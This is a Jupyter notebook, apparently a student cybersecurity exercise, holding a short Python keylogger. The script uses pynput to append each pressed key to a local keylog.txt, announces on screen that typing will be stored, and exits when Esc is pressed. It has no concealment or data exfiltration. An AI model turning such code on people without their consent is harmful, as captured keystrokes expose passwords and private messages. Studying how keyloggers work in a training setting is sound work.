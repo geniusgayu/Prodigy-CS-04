{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "997c9029",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pynput.keyboard\n",
    "\n",
    "print(\"TYPE THE WORDS IN KEYBOARD : \\n\")\n",
    "print(\"THAT WILL BE STORED IN KEYLOGS......\")\n",
    "\n",
    "def write_to_file(key):\n",
    "    character = str(key)\n",
    "    character = character.replace(\"'\", \"\")\n",
    "\n",
    "    if character == \"Key.space\":\n",
    "        character = \" \"\n",
    "    elif character == \"Key.enter\":\n",
    "        character = \"\\n\"\n",
    "    elif character == \"Key.backspace\":\n",
    "        character = \"[BACKSPACE]\"\n",
    "\n",
    "    with open(\"keylog.txt\", \"a\") as file:\n",
    "        file.write(character + '\\n')\n",
    "\n",
    "def on_press(key):\n",
    "    try:\n",
    "        write_to_file(key)\n",
    "    except AttributeError:\n",
    "        pass\n",
    "\n",
    "\n",
    "def on_release(key):\n",
    "    if key == pynput.keyboard.Key.esc:\n",
    "        \n",
    "        return False\n",
    "\n",
    "\n",
    "with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "    listener.join()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
